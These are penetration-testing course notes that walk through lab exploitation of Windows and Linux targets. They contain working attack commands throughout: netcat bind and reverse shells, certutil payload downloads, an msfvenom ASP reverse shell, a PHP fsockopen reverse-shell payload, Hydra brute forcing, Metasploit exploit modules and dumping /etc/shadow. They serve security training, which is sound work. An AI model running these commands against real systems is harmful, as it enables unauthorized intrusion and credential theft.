# Host & Network Penetration Testing - Exploitation

<br>

## 1. Vulnerability Scanning

### 1.1. Banner Grabbing

In this task you will learn how to perform banner grabbing in order to obtain service version information from specific services running on a target system.

```shell
nmap -sV <target_IP>
```

In certain cases, a traditional **Nmap service version detection scan may not reveal accurate information** about the exact version of a service that is running on a target system. As a result, you may need to manually interact with a port to identify the exact service version. Banner grabbing can be automated through the use of an Nmap script. In this case, we will be using the **banner.nse** script.

```shell
ls -al /usr/share/nmap/scripts | grep banner
nmap -sV --script=banner <target_IP>
```

**Netcat** can be also used to perform banner grabbing manually on a port by directly connecting to it.

```shell
whatis nc
man nc
nc <target_IP> <port_number>
```

### 1.2 Vulnerability (not exploitation) Scanning With Nmap Scripts

In this lab you will learn how to perform vulnerability scanning by **leveraging the Nmap scripting engine**.

```shell
# Identifying the services running on the target system.
nmap -sV -O <target_IP>
# A CGI script is a script that runs on a web server that is able to execute system level commands and display the output on the web server.
```

**ShellShock** is a vulnerability that affects Bash versions 1.0.3-4.3 and allows attackers to remotely execute commands on a Linux target by injecting malicious HTTP headers.

```shell
ls -al /usr/share/nmap/scripts/

ls -al /usr/share/nmap/scripts/ | grep http 
nmap -sV -p 80 --script=http-enum <target_IP>

searchsploit apache 2.4.6
# No results

nano /usr/share/nmap/scripts/http-enum.nse
# In order to understand what a script is doing

ls -al /usr/share/nmap/scripts/ | grep ftp
ls -al /usr/share/nmap/scripts/ | grep vuln
ls -al /usr/share/nmap/scripts/ | grep shellshock

# View the source code for the countdown as we have a countdown in the page. search for the gettime.cgi
<target_IP>/gettime.cgi

nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <target_IP>
# Read the output / Vulnerability scanning with namp
```

<br>

## 2. Searching for Exploits

### 2.1. Searching for Publicly Available Exploits

The next step is to find and identify exploit code that can be used to take advantage of the vulnerabilities we’ve discovered. It’s important to note that downloading and running exploit code against a target can be very dangerous, especially when it's obtained from unverified sources.

- exploit-db
- rapid7

An example of recommended Google search: 
- vsftpd 2.3.4 site:exploit-db.com
- vsftpd 2.3.4 site:rapid7.com

Check also [packet storm](https://packetstorm.news/).

### 2.2. Searching for Exploits with SearchSploit

First we need to install or update the exploit DB package if it's not installed already. 

```shell
# Update package list and install the Exploit Database (SearchSploit tool)
sudo apt-get update && sudo apt-get install exploitdb -y

# List contents of the ExploitDB directory
ls -al /usr/share/exploitdb
ls -al /usr/share/exploitdb/exploits/windows/remote  # View Windows remote exploits

# Launch SearchSploit (local exploit search tool)
searchsploit

# Update the local copy of the ExploitDB repository
searchsploit -u

# Search for exploits related to vsftpd (results may be vague)
searchsploit vsftpd

# Refine the search by specifying the exact version for better accuracy
searchsploit vsftpd 2.3.4

# SearchSploit output includes two important columns:
# 1. Exploit title or description
# 2. Path to the local exploit file or the online URL for download

# To copy an exploit to your current working directory:
searchsploit -m 49757
ls  # Verify the exploit was copied
vim 49757.py  # Open and review/edit the exploit code
```

Using **SearchSploit** effectively to search for exploits locally and online, with advanced filtering options like case sensitivity, exact matches, and keyword targeting for specific platforms, services, or vulnerabilities.

```shell
# One of the great features of SearchSploit is its ability to perform case-sensitive searches and filter results based on title or exact match.

# Case-sensitive search (use -c flag)
searchsploit -c OpenSSH # Case-sensitive: will only match "OpenSSH"
searchsploit -c openssh # Lowercase input won't match "OpenSSH" unless it's written exactly
searchsploit openssh # Without -c, it's case-insensitive

# Search only in exploit titles (use -t flag)
searchsploit -t vsftpd # Shows only entries with "vsftpd" in the title
searchsploit -t "Buffer Overflow" # Shows only entries with "Buffer Overflow" in the title

# Exact match search (use -e flag)
searchsploit -e "Windows XP" # Finds exact "Windows XP" strings
searchsploit -e "Windows XP" | grep -e "Microsoft" # Filter results for Microsoft-related exploits

# SearchSploit supports complex filters like on the Exploit DB website:
# For example, combining target type, platform, and service:

searchsploit remote windows buffer # Remote Windows buffer overflow exploits
searchsploit remote linux ssh # Remote Linux SSH exploits
searchsploit remote webapps wordpress # WordPress-related web app exploits
searchsploit remote webapps drupal # Drupal-related web app exploits
searchsploit local windows # Local privilege escalation exploits for Windows

# Search for EternalBlue SMB exploits locally
searchsploit remote windows smb | grep -e "EternalBlue"

# Use the -w flag to get web links to Exploit DB entries (instead of local paths)
searchsploit remote windows smb -w | grep -e "EternalBlue"
```

<br>

## 3. Fixing Exploits

### 3.1. Fixing Exploits

 Find publicly available exploits with Searchsploit and fix/modify exploits to get them to work as intended. When using publicly available exploit code, you may run across issues with the exploit script and as a result, you must be able to modify the exploit code to get it to work correctly based on your requirements.

```shell
nmap -sV <target_IP>
```

One specific service stands out, it looks like there is a vulnerable version of the Rejetto HTTP File Server running on port 80, more specifically version 2.3.

This version of the Rejetto HFS is vulnerable to a remote code execution vulnerability that can be exploited both manually and automatically with Metasploit, however, in this case, we will be taking a look at how to exploit this vulnerability manually with publicly accessible exploit code.

```shell
searchsploit HTTP File Server 2.3
# We can copy the exploit file to our current working directory with Searchsploit.
searchsploit -m 39161
# This exploit, while functional, does not work out of the box and needs to be modified per the environment you are working in and the configuration of the target.
```

Now that we have copied the exploit to our current working directory, we can modify it with VIM.

```shell
vim 39161 # We can see that this is a python exploit. 
# This exploit requires you to change the local IP and local port values.
# ip_addr
# local_port
```

After modifying the exploit code, we can run it with Python to ensure that it works correctly. For this exploit to work, you will need to host the nc.exe on a web-server as the exploit will download it to the target system. Kali Linux comes pre-packaged with various Windows binaries, one of which is the nc.exe executable found under:

- `/usr/share/windows-resources/binaries/nc.exe`

We can copy the nc.exe executable to the Desktop by running the following command:

```shell
cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/ # or .

# After copying the nc.exe executable to the Desktop, we can host it by setting up an HTTP server on port 80 with Python.
python -m SimpleHTTPServer 80 # Terminal1

# Next, we will need to open a new terminal window where we will set up the Netcat listener to receive the connection from the target once the exploit script is executed.
nc -nvlp <port_number_set> # Terminal 2

python 39161.py <target-ip> 80 # Terminal 3. Run it twice

# If the exploit script runs successfully, we should receive a reverse shell on our Netcat listener.
# We should see the reverse shell.
whoami
systeminfo
```

<br>

## 4. Bind & Reverse Shells

### 4.1. Netcat Fundamentals

Before talking about Reverse Shells, we need to get an understanding of a very important tool that will essentially be pivotal within this process.

**Netcat**, often referred to as the "Swiss Army knife" of networking, is a versatile tool that allows users to interact with network connections. It can be used for a wide range of tasks, including port scanning, transferring files, and setting up network listeners or reverse shells. Its simplicity and flexibility make it an essential tool for network administrators and penetration testers.

**Objective**: Explore the use of Netcat to set up a listener, transfer messages, and transfer files between two systems.

```shell
nc -help # netcat documentation
man nc # General Commands Manual

# Netcat provides you with the ability to connect to open ports on a target system
nc <target_IP> 80
# In this case, we are connecting to port 80 on the target system and because port 80 is running a web server we don't get a banner.

# Enable verbose output and disable DNS resolution
nc -nv <target_IP>

# Netcat can also be used to connect to UDP ports.
nc -nvu <target_IP>
```

In order to analyze how Netcat works in both server and client mode, we will need to transfer the nc.exe executable to the target system running Windows.

```shell
cd /usr/share/windows-binaries

# We can then setup an HTTP server with Python within this directory
python -m SimpleHTTPServer 80

# From the target Windows system, run via terminal the following command:
certutil -urlcache -f http://<my_kali_IP>/nc.exe nc.exe

# Now that we have Netcat setup on both systems, we can setup a Netcat listener on the Kali Linux system
nc -nvlp 1234

# We can now connect to the Netcat listener from the Windows Target system using the command line
nc -nv <my_kali_IP> 1234

# Now that we have established a connection between the Netcat listener and Netcat client, we can transfer messages between the two like a simple chat application.
```

Netcat can also be used to transfer files between a listener and a client.

```shell
# To get started, we can create a file called test.txt on the Kali Linux system with some sample data by running the following command:
echo "Hello, this was sent over with Netcat" >> test.txt

# We will now need to setup a Netcat listener on the recipient system, which in this case is the Windows system.
nc.exe -nvlp 1234 > test.txt

# On the Kali Linux system, we will need to connect to the listener and redirect the content of the test.txt file in to Netcat. 
nc -nv 10.0.27.35 1234 < test.txt
```

### 4.2. Bind Shells

A **bind shell** is a type of remote shell where the attacker connects to a listener on the target system. In order for this to work a listener needs to be running on the target system so that the attacker can connect to it and consequently obtain a remote shell. This type of shell is not preferred as the attacker directly connects to the target system and in most cases, ingress traffic is always blocked or flagged as suspicious. Nonetheless, it is very important to learn how bind shells work and how they can be setup with Netcat.

**Objective**: Your task is to setup a bind shell with Netcat.

In order to setup a bind shell with Netcat, we will need to transfer the nc.exe executable to the target system running Windows.

```shell
# The first step will involve navigating to the /usr/share/windows-binaries directory.
cd /usr/share/windows-binaries/

# We can then setup an HTTP server with Python within this directory by running the following command:
python -m SimpleHTTPServer 80

# You will then need to open up a command prompt, navigate to the Desktop directory and run the following command to download the nc.exe executable from the web server being hosted on the Kali Linux system.
certutil -urlcache -f http://<my_kali_IP/nc.exe nc.exe

# Setting up the bind shell listener on the Windows system.
.\nc.exe -nvlp 1234 -e cmd.exe

# Back to Kali shell
nc -nv <target_IP> 1234
```

### 4.3. Reverse Shells

**A reverse shell is** a type of remote shell where the target system connects to a listener on the attacker's system. In order for this to work the target system needs to connect to a listener on the attacker's system.

In a reverse shell, the target system initiates a connection back to the attacker, so no special tools like Netcat are needed on the target. However, this method requires the target to know the attacker's IP address, which introduces risks: the IP must be embedded in the payload, and if the payload is stored on disk, it can expose the attacker during forensic analysis. This makes reverse shells powerful but potentially revealing, especially if stealth is a priority.

```shell
# Transferring the Netcat executable to the Windows system
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80

# Navigate to the Desktop directory and run the following command to download the nc.exe executable from the web server being hosted on the Kali Linux system.
certutil -urlcache -f http://<my_kali_IP>/nc.exe nc.exe

# In the case of reverse shell we need to set up the Netcat listener on the attacker system, which in this case is Kali Linux.
nc -nvlp 1234

# We can now connect to the reverse shell listener running on the Kali Linux system from the Windows system by running the following command:
nc.exe -nv <my_kali_IP>1234 -e cmd.exe

# On the Kali system we can:
whoami
```

The great thing about a reverse shell is that, since the connection to the Netcat listener is initiated by the target system, it doesn't have to rely on Netcat. The connection can also be established using PowerShell commands on Windows or standard Bash commands on Linux.

### 4.4.  Reverse Shells Cheat-sheet

The connection to the netcat listener on the attacker system can be made through the use of Power Shell code; we can do it with simple bash code of just Python code, C code.

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Rev Shells](https://www.revshells.com/)

<br>

## 5. Exploitation framework

### 5.1. The Metasploit Framework (MSF) ⚗️

When using the Metasploit Framework with Meterpreter payloads, you don’t use a standard Netcat listener to receive the connection. Instead, you need to use the `multi/handler` module, which is designed to handle incoming connections from Metasploit payloads. This module acts as a listener for reverse shells and can also be configured to handle raw Netcat connections if needed.

In this section we are primarily going to be focused on exploit modules and payloads (Exploitation).

```shell
nmap -sS -sV <target_IP>
# Based on the output we can say that is a Windows system
# We are not getting any info about the version. Search online Process Maker default credentials
# admin - admin / login is successfull
# System Information > ProcessMaker Ver. ****
# We can now start searching vuln for this specific version

searchsploit ProcessMaker

service postgresql start && msfconsole
search ProcessMaker
use exploit/multi/http/processmaker_exec
set RHOSTS <target_IP>
exploit

cd /
ls
cat flag.txt

searchsploit -m 29325 # Make a copy and analyze it locally
vim 29325.rb # So let's get an understanding on what this module does. We can see that it's developed in Ruby
# However we are interested in the description section of the metasploit module -- q!
# This module is designed to work with the metasploit module
```

### 5.2. PowerShell - Empire

One of the key differences between PowerShell Empire and the Metasploit Framework is that Metasploit supports exploitation across a wide range of operating systems, platforms, and web applications — including PHP, JSP, ASP, and more. In contrast, PowerShell Empire is a more specialized tool focused specifically on exploitation and post-exploitation. Unlike Metasploit, Empire does not include built-in modules for information gathering, enumeration, or vulnerability scanning. As the name suggests, it’s primarily designed for targeting Windows systems. While it's not strictly limited to Windows, most of its advanced post-exploitation capabilities are geared toward Windows environments.

- [PowerShell Empire - Starkiller](https://github.com/BC-SECURITY/Starkiller)

<br>

## 6. Windows Exploitation

### 6.1. Port Scanning & Enumeration - Windows

**Objective**: To identify the open ports on the system and identify any potentially interesting services that can be exploited to gain access to the system.

```shell
nmap -sV <target_IP>
# We can identify quite a few open ports running different services that could potentially be viable access vectors.

# Now that we have identified the open ports on the target system and the respective services running on them, we can also perform a Nmap script scan on 10000 ports to get additional information regarding the services running on the open ports.
nmap -T4 -PA -sC -sV -p 1-10000 <target_IP>
```

Since the target runs Windows, we can enumerate SMB (port 445) to gather detailed OS info. Metasploit is ideal for this — import your scans, create a new workspace for each engagement to stay organized, and remember the previous scan only covered the top 10,000 ports, so it wasn't fully comprehensive.

```shell
nmap -T4 -PA -sC -sV -p 1-10000 <target_IP> -oX nmap_10K
service postgresql start && msfconsole
workspace -a 10K_port_scanning
db_import <filename and file path>
hosts
services
vulns
```

Let's see how to scan UDP ports now:

```shell
nmap -sU -sV <target_IP> # Something that can be done during the scanning session.
```

**Note:** As penetration testers, it's vital to quickly identify and prioritize potentially vulnerable services. Not all services are exploitable, so recognizing low-hanging fruit and choosing the simplest path is key. Time is critical, and smart, focused work is essential to meet tight deadlines.

### 6.2. Targeting Microsoft IIS FTP

Microsoft FTP is a server feature that supports the transfer of files between machines using the File Transfer Protocol (FTP), commonly integrated with IIS to manage files over the web.

**Objective**: To outline the various techniques that can be used to exploit a Windows system running a Microsoft FTP server.
- Understand how to exploit vulnerabilities in a Windows system running Microsoft FTP Service
- Identify weak configurations
- Test for anonymous access 
- Conduct brute force attacks to gain unauthorized access and manipulate web server contents.

```shell
# We will be targeting the FTP server, as a result, we can limit our Nmap scan to ports 21 and 80.
nmap -sV -sC -p21,80 <target_IP>
# In this case the default Nmap script scan does not reveal any useful information that can be used for exploitation.

# In certain cases, anonymous access to the FTP server may be enabled, therefore allowing us to log in to the FTP server without providing any legitimate credentials.
ftp <target_IP> 21
# Use the credentials anonymous/anonymous to check whether anonymous logins are allowed
# In this case, it looks like the FTP server does not allow anonymous logins. As a result, we will need to explore other techniques for exploiting the FTP server.

hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <target_IP> ftp
# We can now use these credentials that we have obtained to authenticate to the FTP server, this can be done by running the following command:
ftp <target_IP> 21
```

**Additional insights**

```shell
ls -al /usr/share/nmap/scripts/ | grep ftp-
# We can see ftp-anon.nse, script used to check whether an FTP server allows anonymous login.
nmap -sV -p 21 --script=ftp-anon <target_IP>
# In this case the script doesn't return any results. We can always test it manually
```

The web application hosted on the server is very basic, it doesn’t contain any data or configuration files that could help us identify vulnerabilities or ways to exploit the system. However, we do notice the presence of an `.asp` file. Since Microsoft IIS supports various web scripting extensions, including ASP, this indicates that the server is capable of executing ASP files, which may provide an opportunity for code execution or further exploitation.

At this point, we can try generating an ASP reverse shell using `msfvenom`, upload the resulting ASP file to the web server, and attempt to execute it to establish a reverse connection. However, this approach might not always work as expected—some servers restrict ASP to basic scripting functionality, which can prevent full reverse shell execution. Still, it's worth testing, as successful execution could give us remote access to the target system.

```shell
msfvenom -p windows/shell/reverse_tcp LHOST=<local_IP> LPORT=1234 -f asp > shell.aspx
ftp <target-ip> 21 # Log in using the credentials
put shell.aspx
dir # We successfully upload the shell.aspx file

# Open a new terminal tab
service postgresql start && msfconsole
use exploit/multi/handler
set LHOST <local_IP>
set LPORT 1234
set payload windows/shell/reverse_tcp
run
# However we are not able to get a reverse shell yet.
```

### 6.3. Targeting OpenSSH

**OpenSSH** is a critical component in network security, offering encrypted communication sessions over a computer network using the SSH protocol. In this section we are going to:
- Identify server vulnerabilities
- Utilize brute force attacks to discover valid user credentials
- Gain remote access to the system

```shell
ping -c 1 <target_IP>
nmap -sV -sC -p 22 <target_IP>
# Given that we have obtained the exact version of OpenSSH running on the target system.

# We can now utilize Searchsploit to search for exploits that affect this specific version of OpenSSH.
searchsploit OpenSSH 7.1
# We can utilize these scripts to enumerate user accounts on the target system.


# We can also perform a brute-force attack on the OpenSSH server to identify legitimate credentials that can be used to authenticate with the target system.
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <target_IP> ssh

ssh <user>@<target_IP>

ls -al
pwd
whoami
net localgroup admin
# Disable SSH logins into the administrator account is a good practice from administrators  
```

### 6.4. Targeting SMB

Focus on:
- exploiting SMB vulnerabilities on a Windows target, 
- outlining methods to scan for weaknesses, 
- perform brute force attacks to acquire credentials,
- utilize these credentials for deeper system access and control.

```shell
ping -c 1 demo.ine.local
nmap -sV -sC -p445 <target_IP>

# We can use these user accounts to perform a brute force attack to identify legitimate SMB credentials that we can use to authenticate with the target system.
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <target_IP> smb
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt <target_IP> smb

# Now that we have legitimate SMB credentials, we can use them to enumerate other user accounts on the Windows target by leveraging an enumeration utility called enum4linux.
enum4linux -u <username> -p <password> -U <target_IP>

# Given that we have legitimate user credentials on the Windows target, we can remotely authenticate with the target system via SMB to obtain remote access to the target system. This can be done through the use of the Python implementation of PsExec.
cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
chmod +x psexec.py
python3 psexec.py Administrator@<target_IP>

# We can also utilize the exploit/windows/smb/psexec Metasploit module to obtain a meterpreter session on the target system.
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <target_IP>
set SMBUser Administrator
set SMBPass vagrant
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

### 6.5. Targeting MySQL Database Server

This focuses on techniques for exploiting MySQL on a Windows target, including identifying vulnerabilities, gaining unauthorized access, and manipulating database information to achieve administrative control.

```shell
ping -c 1 <target_IP>
nmap -sV -sC -p 3306, 8585 <target_IP>
searchsploit MySQL 5.5

# To begin with, we will need to start the Metasploit Framework console (msfconsole), this can be done by running the following command:
service postgresql start && msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target_IP>
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
exploit

# Password for the root user is NULL which means that we can log in to the MySQL database server with the root user account without providing a password!
# Given that we have identified the root user password for the MySQL database server, we can remotely authenticate the MySQL database server by running the following command:
mysql -u root -p -h <target_IP>
show databases;
use wordpress;
show tables;
select * from wp_users;
# From this point, we can copy the password hashes displayed in the user_pass column. 
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';

# We can now navigate to the WordPress site via a browser by accessing the following URL:
http://<target_IP>:<target_port>/wordpress/wp-admin
```

<br>

## 7. Linux Exploitation

### 7.1. Port Scanning & Enumeration - Linux

Port scanning and enumeration are fundamental techniques that help identify open ports, services running on those ports, and potential vulnerabilities on target systems.

**Objective:** Identify open ports on the target system and identify any potentially interesting services that can be exploited to gain access to the system.

```shell
ping -c 1 <target_IP> # Check if the host is alive

# We can begin by performing a service detection scan on 10,000 TCP ports with Nmap on the target system
nmap -sV -p 1-10000 <target_IP>

# Most of the services identified by the Nmap scan are easily recognizable, however, there are a few open ports on the target system that do not have a service banner. For example port 512 and 1524. We can perform banner grabbing with Netcat.
nc -nv <target_IP> 512
nc -nv <target_IP> 1524 
# Why did we receive a shell? We received a shell because the port was running a bind shell.
```

>[!note]
>Remember that whenever Nmap provides us with the service and then a question mark at the end, that means that it's not really sure what this service is and what it's used for, so we would probably manually check this ports with Netcat to see what banner they actually bring up.

### 7.2. Targeting vsFTPd

We are going to explore additional techniques that can be used to exploit an FTP server as well as exploring how we use or obtain a reverse shell.

```shell
ping -c 1 <target_IP>
nmap -sV -sC -p 21 <target_IP>

ftp <target_IP> 21 # anonymous
cd /
ls
```

Previously, the FTP server worked alongside the web server, giving access to the web directory and its files. In this case, however, anonymous FTP access doesn’t reveal any useful directories. While we’ve logged in successfully, we can’t access anything meaningful - this is due to the limited permissions of the anonymous user. If we can find valid user credentials, we might gain access to other directories with more useful content.

The “Connection Refused” error occurs because the backdoor in the vulnerable version of VSFTP (2.3.4) is no longer active. This version had a known vulnerability where attackers modified the source code to include a backdoor that opened a bind shell listener on port 6200, allowing remote access via Netcat. In this case, it appears the system administrator has removed the backdoor, which is why the connection to port 6200 is refused. If we look at the script, we can see a line like `tn2 = Telnet(host, 6200)`, which indicates it’s trying to connect to that backdoor port.

```shell
searchsploit vsftpd

service postgresql start && msfconsole 
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_IP>
exploit
# The exploit module runs but is not successful and as a result, we are not able to gain access to the target system.
# In this case, it looks like the vulnerability has been patched on the system therefore rendering this exploit ineffective. We will have to find another way in.

hydra
-L /usr/share/metasploit-framework/data/wordlists/unix_users.txt
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
<target_IP> ftp

ftp <target_IP> 21
# Use the credentials
```

### 7.3. Targeting PHP

PHP is a widely-used server-side scripting language for web development. Its popularity and extensive use in web applications make it a common target for penetration testers.

**Objective:** Exploit the vulnerable PHP running on the target web server and gain a meterpreter session.

```shell
ping -c 1 <target_IP>
nmap -sV -sC -p 80 <target_IP>
# As shown in the following screenshot, the Nmap scan reveals that Apache 2.2.8 is running on port 80.

# Check the PHP version via web browser 
<target_IP>/phpinfo.php

searchsploit php cgi
# As shown in the following screenshot, the Searchsploit search reveals quite a few exploits, however, one stands out as a potentially useful exploit -- PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection

service postgresql start && msfconsole
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS <target_IP>
exploit
```

**Different approach**

```shell
# Step 1: Download the exploit using SearchSploit
searchsploit -m 18836.py # Copy exploit to current directory
vim 18836.py # Open the script to review

# Step 2: Run the original exploit to confirm code execution
python2 18836.py <target_IP> 80  # You may see 'phpinfo' output, confirming RCE is possible

# Step 3: Modify the exploit to include a reverse shell payload
vim 18836.py
# Replace the payload with a reverse shell (insert your Kali IP)
# Try file descriptor 3 first
pwn_code = """<?php $sock=fsockopen("<kali_IP>", 1234); exec("/bin/sh -i <&3 >&3 2>&3"); ?>"""
:wq # Save and exit

# Step 4: Start a Netcat listener in a new terminal
nc -nvlp 1234 # Listen for the reverse shell on port 1234

# Step 5: Run the exploit again to trigger the reverse shell
python2 18836.py <target_IP> 80

# Step 6: If no shell appears, change the file descriptor (e.g., to 4)
vim 18836.py
pwn_code = """<?php $sock=fsockopen("<kali_IP>", 1234); exec("/bin/sh -i <&4 >&4 2>&4"); ?>"""
:wq # Save and exit

# Restart the listener and run the exploit again
nc -nvlp 1234
python2 18836.py <target_IP> 80

# Step 7: Once connected, upgrade the shell if needed
/bin/bash -i # Get an interactive shell

# Step 8: Verify you’re inside the web server environment
pwd # Should be something like /var/www
cat /etc/*release # Check Linux distribution

# Note: This manual method helps understand the process deeply.
# The same result could be achieved with Metasploit, but this offers better control.
```

### 7.4. Targeting SAMBA

**Objective:** Exploit the vulnerable Samba service and gain a shell.

```shell
# Step 1: Scan the target's SMB port and attempt to detect the Samba version
nmap -sV -p 445 <target-ip>  # -sV enables service version detection

# The result shows Samba version range as 3.X - 4.X but not the exact version

# Step 2: Manually connect to the port to see if any banner is shown
nc -nv <target-ip> 445  # No banner is returned, so manual checking isn't helpful here

# Step 3: Use Metasploit to accurately enumerate the Samba version
service postgresql start && msfconsole
search smb_version
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS <target-ip>  # Set the target IP
run

# Now we get the exact Samba version (e.g., Samba 3.0.20)

# Step 4: Search for exploits for that version using SearchSploit
searchsploit samba 3.0.20
# In the output, look for known vulnerabilities.
# For example: 'Username map script' Command Execution (Metasploit available)

# Step 5: Go back to Metasploit and load the corresponding exploit
search samba 3.0.20
use exploit/multi/samba/usermap_script
show info  # Review the exploit details
set RHOSTS <target-ip>
show options  # Review required settings and payloads
# Optional: change payload or adjust settings if needed
exploit  # Launch the exploit

# If successful, you now have a basic shell session on the target
ls -al  # Confirm access
cat /etc/*release  # Check target OS info

# Step 6: Background the session and manage it
background
sessions  # List current sessions

# Upgrade shell to Meterpreter for more capabilities
sessions -u 1  # Upgrade session 1 to Meterpreter
sessions  # Confirm new Meterpreter session is active

# Step 7: Post-exploitation - verify system access and gather sensitive info
sysinfo  # Display system info
getuid  # Show current user (likely root)
cat /etc/passwd  # List user accounts
cat /etc/shadow  # Dump password hashes (if root access is available)
```

